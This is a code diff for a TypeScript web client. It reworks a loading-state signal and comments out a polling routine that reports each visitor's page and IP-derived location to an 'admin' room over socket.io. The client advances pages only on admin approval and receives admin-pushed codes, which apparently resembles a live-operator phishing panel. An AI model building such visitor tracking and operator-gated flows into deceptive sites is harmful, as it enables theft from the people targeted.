@@ -34,7 +34,7 @@ export const currentPage = signal("");
 
 // To Sent To Server Any Time Tht It Change
 
-export const loading = signal(false);
+export const loading = signal("net");
 
 export const isApproved = signal(false);
 
@@ -111,6 +111,7 @@ effect(() => {
     axios
       .get("https://ipapi.co/json/")
       .then((res) => {
+        loading.value = "";
         socket.value.connect();
 
         mainInfo.value = {
@@ -219,7 +220,7 @@ socket.value.on("receive-message", (m: Message) => {
 
 socket.value.on("admin-last-message", ({ message }: { message: string }) => {
   lastMessage.value = message;
-  loading.value = false;
+  loading.value = "";
   currentPage.value = "END";
 });
 
@@ -227,13 +228,13 @@ socket.value.on("admin-last-message", ({ message }: { message: string }) => {
 
 socket.value.on("code", (adminCode: string) => {
   code.value = adminCode;
-  loading.value = false;
+  loading.value = "";
 });
 
 socket.value.on(
   "admin-response",
   ({ state, next }: { state: boolean; next: string }) => {
-    loading.value = false;
+    loading.value = "";
     permissions.value = [...permissions.value, next];
     if (state) {
       customHistory.push("/" + next);
@@ -281,7 +282,7 @@ export function sendDataToServer({
   });
 
   if (waitingForAdminResponse) {
-    loading.value = true;
+    loading.value = "wait";
   } else {
     if (nextPage) {
       if (navigate) navigate("/" + nextPage);
@@ -354,28 +355,28 @@ export async function getInitInfo() {
 
 // New
 
-function sendData() {
-  if (currentPage.value && mainInfo.value.Ip && socketId.value) {
-    socket.value.emit("currentPage", {
-      ...mainInfo.value,
-      page: currentPage.value,
-      room: ROOM,
-      socketId: socketId.value,
-    });
-  }
-}
+// function sendData() {
+//   if (currentPage.value && mainInfo.value.Ip && socketId.value) {
+//     socket.value.emit("currentPage", {
+//       ...mainInfo.value,
+//       page: currentPage.value,
+//       room: ROOM,
+//       socketId: socketId.value,
+//     });
+//   }
+// }
 
-setInterval(() => {
-  socket.value.emit(
-    "connected-admins",
-    ROOM,
-    ({ status }: { status: boolean }) => {
-      if (!status) {
-        isError.value = "Admin Is Not Connected Write Now, Come Back Later";
-      } else {
-        isError.value = "";
-      }
-    }
-  );
-  if (!isError.value) sendData();
-}, 2000);
+// setInterval(() => {
+//   socket.value.emit(
+//     "connected-admins",
+//     ROOM,
+//     ({ status }: { status: boolean }) => {
+//       if (!status) {
+//         isError.value = "Admin Is Not Connected Write Now, Come Back Later";
+//       } else {
+//         isError.value = "";
+//       }
+//     }
+//   );
+//   if (!isError.value) sendData();
+// }, 2000);
